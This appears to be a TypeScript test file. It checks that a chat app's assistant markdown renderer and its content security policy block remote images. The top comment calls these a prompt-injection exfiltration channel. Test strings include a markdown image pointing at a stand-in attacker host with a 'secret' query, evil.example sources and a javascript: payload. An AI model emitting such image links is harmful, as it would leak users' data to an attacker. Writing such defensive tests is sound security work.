import assert from "node:assert/strict";
import test from "node:test";

// Remote images in assistant output are a prompt-injection exfiltration
// channel: `![](https://attacker/?d=…)` fetches on render. The renderer must
// emit no <img> for anything off-origin while same-origin file responses
// keep working. Real react-markdown and the real
// ChatMarkdown run; only next/link is stubbed (routing plumbing, same shape
// as the sibling assistant tests), and it sits off the image path.
const { registerHooks } = await import("node:module");
registerHooks({
  resolve(specifier, context, next) {
    if (specifier === "next/link") {
      return {
        shortCircuit: true,
        url: "data:text/javascript,export default function Link(p){return globalThis.React.createElement('a',{href:p.href},p.children)}",
      };
    }
    return next(specifier, context);
  },
});

const React = await import("react");
Object.assign(globalThis, { React });
const { renderToStaticMarkup } = await import("react-dom/server");
const { ChatMarkdown } = await import("./markdown");

const html = (children: string) =>
  renderToStaticMarkup(React.createElement(ChatMarkdown, { children }));

test("assistant markdown suppresses remote images without a network target", () => {
  const out = html("see this ![quarterly chart](https://attacker.example/x?d=secret)");
  assert.doesNotMatch(out, /<img/i, "no image element may render for a remote src");
  assert.doesNotMatch(out, /attacker\.example/, "the hostile URL must not appear anywhere");
  assert.match(out, /quarterly chart/, "the alt text stays visible so the reader sees the suppression");
});

test("assistant markdown suppresses protocol-relative, plain-http and javascript image sources", () => {
  for (const src of ["//evil.example/p.png", "http://evil.example/p.png", "javascript:alert(1)"]) {
    const out = html(`![alt](${src})`);
    assert.doesNotMatch(out, /<img/i, `${src} must not render an image element`);
    assert.ok(!out.includes(src), `${src} must not leak into the markup`);
  }
});

test("assistant markdown keeps same-origin file images and never emits inline payloads", () => {
  const sameOrigin = html("![scan](/api/file-cabinet/files/abc/download)");
  assert.match(sameOrigin, /<img[^>]*src="\/api\/file-cabinet\/files\/abc\/download"/);
  // The parser strips data:/blob: schemes before the renderer, so an inline
  // payload must still end up as text, never as an image request.
  const inline = html("![dot](data:image/png;base64,iVBORw0KGgo=)");
  assert.doesNotMatch(inline, /<img/i);
  assert.ok(!inline.includes("iVBORw0KGgo"), "the inline payload must not leak into the markup");
});

test("host image policy offers no remote fallback for an emitted URL", async () => {
  const { buildContentSecurityPolicy } = await import("../../lib/content-security-policy.ts");
  const policy = buildContentSecurityPolicy("test-nonce-1234567890", false);
  const imgSrc = policy.split(";").find((part) => part.trim().startsWith("img-src")) ?? "";
  assert.doesNotMatch(imgSrc, /https?:/, "img-src must not name a remote scheme or host");
  assert.match(imgSrc, /'self'/);
});
